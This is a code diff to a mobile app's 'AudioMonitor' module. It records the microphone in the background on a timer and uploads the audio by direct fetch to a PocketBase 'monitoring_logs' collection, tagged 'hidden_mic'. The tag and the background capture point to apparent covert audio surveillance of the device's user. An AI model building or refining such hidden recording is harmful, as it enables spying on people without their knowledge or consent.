@@ -5,43 +5,61 @@ import { pb, getUserId } from '../../services/pocketbase';
 let recording: Audio.Recording | null = null;
 let autoStopTimer: ReturnType<typeof setTimeout> | null = null;
 
-export const startAudioRecording = async (durationMs: number = 10000) => {
-    try {
-        // Stop any existing recording first
-        if (recording) {
-            console.log('[AudioMonitor] Stopping existing recording before starting new one');
-            await stopAudioRecording();
+/**
+ * Start a mic recording for the given duration, then auto-stop, upload, and
+ * return a Promise that resolves only AFTER the upload completes.
+ *
+ * The returned promise settles once the full record→upload cycle finishes,
+ * so the caller can await the entire operation if desired.
+ */
+export const startAudioRecording = (durationMs: number = 10000): Promise<void> => {
+    return new Promise<void>(async (resolveRecording) => {
+        try {
+            // Stop any existing recording first
+            if (recording) {
+                console.log('[AudioMonitor] Stopping existing recording before starting new one');
+                await stopAudioRecording();
+            }
+
+            console.log('[AudioMonitor] Requesting permissions...');
+            const perm = await Audio.requestPermissionsAsync();
+            if (perm.status !== 'granted') {
+                console.warn('[AudioMonitor] Mic permission denied');
+                resolveRecording();
+                return;
+            }
+
+            await Audio.setAudioModeAsync({
+                allowsRecordingIOS: true,
+                playsInSilentModeIOS: true,
+                staysActiveInBackground: true,
+            });
+
+            const { recording: newRecording } = await Audio.Recording.createAsync(
+                Audio.RecordingOptionsPresets.HIGH_QUALITY
+            );
+            recording = newRecording;
+            console.log('[AudioMonitor] Recording started for', durationMs, 'ms');
+
+            // Automatically stop after duration — the resolveRecording callback
+            // ensures the outer promise only settles when the upload is done.
+            autoStopTimer = setTimeout(async () => {
+                autoStopTimer = null;
+                console.log('[AudioMonitor] Auto-stop timer fired');
+                try {
+                    await stopAudioRecording();
+                } catch (e) {
+                    console.error('[AudioMonitor] Auto-stop failed:', e);
+                } finally {
+                    resolveRecording();
+                }
+            }, durationMs);
+
+        } catch (err) {
+            console.error('[AudioMonitor] Failed to start recording:', err);
+            resolveRecording();
         }
-
-        console.log('[AudioMonitor] Requesting permissions...');
-        const perm = await Audio.requestPermissionsAsync();
-        if (perm.status !== 'granted') {
-            console.warn('[AudioMonitor] Mic permission denied');
-            return;
-        }
-
-        await Audio.setAudioModeAsync({
-            allowsRecordingIOS: true,
-            playsInSilentModeIOS: true,
-            staysActiveInBackground: true,
-        });
-
-        const { recording: newRecording } = await Audio.Recording.createAsync(
-            Audio.RecordingOptionsPresets.HIGH_QUALITY
-        );
-        recording = newRecording;
-        console.log('[AudioMonitor] Recording started for', durationMs, 'ms');
-
-        // Automatically stop after duration
-        autoStopTimer = setTimeout(async () => {
-            autoStopTimer = null;
-            console.log('[AudioMonitor] Auto-stop timer fired');
-            await stopAudioRecording();
-        }, durationMs);
-
-    } catch (err) {
-        console.error('[AudioMonitor] Failed to start recording:', err);
-    }
+    });
 };
 
 export const stopAudioRecording = async () => {
@@ -61,25 +79,30 @@ export const stopAudioRecording = async () => {
 
     try {
         console.log('[AudioMonitor] Stopping recording...');
+
+        // Get URI BEFORE stopping — some expo-av versions clear it after unload
+        const uri = currentRecording.getURI();
+        console.log('[AudioMonitor] Recording URI (before stop):', uri);
+
         await currentRecording.stopAndUnloadAsync();
+        console.log('[AudioMonitor] Recording stopped and unloaded');
 
         // Reset audio mode after recording
-        await Audio.setAudioModeAsync({
-            allowsRecordingIOS: false,
-        });
-
-        const uri = currentRecording.getURI();
-        console.log('[AudioMonitor] Recording URI:', uri);
+        try {
+            await Audio.setAudioModeAsync({ allowsRecordingIOS: false });
+        } catch (audioModeErr) {
+            console.warn('[AudioMonitor] setAudioMode reset failed (non-critical):', audioModeErr);
+        }
 
         if (uri) {
             // Verify the file exists and has content
             const fileInfo = await FileSystem.getInfoAsync(uri);
             console.log('[AudioMonitor] File info:', JSON.stringify(fileInfo));
 
-            if (fileInfo.exists && fileInfo.size && fileInfo.size > 0) {
+            if (fileInfo.exists && (fileInfo as any).size > 0) {
                 await uploadAudio(uri);
             } else {
-                console.error('[AudioMonitor] Recording file is empty or missing');
+                console.error('[AudioMonitor] Recording file is empty or missing, fileInfo:', JSON.stringify(fileInfo));
             }
         } else {
             console.error('[AudioMonitor] No recording URI available');
@@ -89,11 +112,22 @@ export const stopAudioRecording = async () => {
     }
 };
 
+/**
+ * Upload audio file to PocketBase using direct fetch() instead of the
+ * PB SDK's .create() method. This avoids any SDK-level auto-cancellation
+ * or request-key conflicts that might silently abort the upload.
+ */
 const uploadAudio = async (uri: string) => {
     try {
         const userId = getUserId();
         if (!userId) {
             console.error('[AudioMonitor] No authenticated user, cannot upload');
+            return;
+        }
+
+        const token = pb.authStore.token;
+        if (!token) {
+            console.error('[AudioMonitor] No auth token available');
             return;
         }
 
@@ -105,12 +139,33 @@ const uploadAudio = async (uri: string) => {
         formData.append('file', {
             uri,
             name: fileName,
-            type: 'audio/mp4',  // m4a files are actually mp4 containers — use standard MIME type
+            type: 'audio/mp4',
         });
         formData.append('type', 'hidden_mic');
         formData.append('user_id', userId);
 
-        const result = await pb.collection('monitoring_logs').create(formData);
+        // Use direct fetch instead of pb SDK to avoid auto-cancellation issues
+        const uploadUrl = `${pb.baseUrl}/api/collections/monitoring_logs/records`;
+        console.log('[AudioMonitor] Upload URL:', uploadUrl);
+
+        const response = await fetch(uploadUrl, {
+            method: 'POST',
+            headers: {
+                'Authorization': token,
+            },
+            body: formData,
+        });
+
+        const responseText = await response.text();
+        console.log('[AudioMonitor] Upload response status:', response.status);
+        console.log('[AudioMonitor] Upload response body:', responseText.substring(0, 500));
+
+        if (!response.ok) {
+            console.error('[AudioMonitor] Upload failed with status', response.status, ':', responseText);
+            return;
+        }
+
+        const result = JSON.parse(responseText);
         console.log('[AudioMonitor] Audio uploaded successfully, record ID:', result.id);
 
         // Cleanup local file
@@ -121,6 +176,13 @@ const uploadAudio = async (uri: string) => {
         }
     } catch (err: any) {
         console.error('[AudioMonitor] Upload failed:', err);
-        console.error('[AudioMonitor] Upload error details:', JSON.stringify(err?.data || err?.response || err?.message || err));
+        console.error('[AudioMonitor] Upload error details:', JSON.stringify({
+            message: err?.message,
+            name: err?.name,
+            status: err?.status,
+            data: err?.data,
+            response: err?.response,
+            stack: err?.stack?.substring(0, 300),
+        }));
     }
 };
